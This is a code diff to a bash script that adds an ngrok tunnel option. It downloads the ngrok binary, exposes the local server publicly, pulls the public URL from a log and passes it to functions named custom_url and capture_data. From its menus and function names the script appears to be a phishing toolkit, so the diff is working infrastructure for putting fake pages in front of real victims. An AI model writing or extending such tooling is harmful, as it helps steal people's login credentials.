@@ -338,6 +338,25 @@ install_localxpose() {
 	fi
 }
 
+install_ngrok() {
+	if [[ -e ".server/ngrok" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} ngrok already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok...${WHITE}"
+		arch=$(uname -m)
+
+		if [[ "$arch" == *'armv7'* || "$arch" == *'arm'* ]]; then
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
+		elif [[ "$arch" == *'aarch64'* || "$arch" == *'arm64'* ]]; then
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
+		else
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
+		fi
+	fi
+}
+
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
@@ -518,6 +537,26 @@ start_localhost() {
 	capture_data
 }
 
+## Start ngrok
+start_ngrok() {
+	rm .ngrok.log > /dev/null 2>&1 &
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching ngrok..."
+
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.server/ngrok http "$HOST:$PORT" --log=.server/.ngrok.log > /dev/null 2>&1 &
+	else
+		sleep 2 && ./.server/ngrok http "$HOST:$PORT" --log=.server/.ngrok.log > /dev/null 2>&1 &
+	fi
+
+	sleep 8
+	ngrok_url=$(grep -o 'https://[a-z0-9\-]*\.ngrok-free\.app' ".server/.ngrok.log" | head -n 1)
+	custom_url "$ngrok_url"
+	capture_data
+}
+
 ## Tunnel selection
 tunnel_menu() {
 	{ clear; banner_small; }
@@ -526,6 +565,7 @@ tunnel_menu() {
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
 		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
 		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+		${RED}[${WHITE}04${RED}]${ORANGE} NGROK 
 
 	EOF
 
@@ -538,6 +578,8 @@ tunnel_menu() {
 			start_cloudflared;;
 		3 | 03)
 			start_loclx;;
+		4 | 04)
+			start_ngrok;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
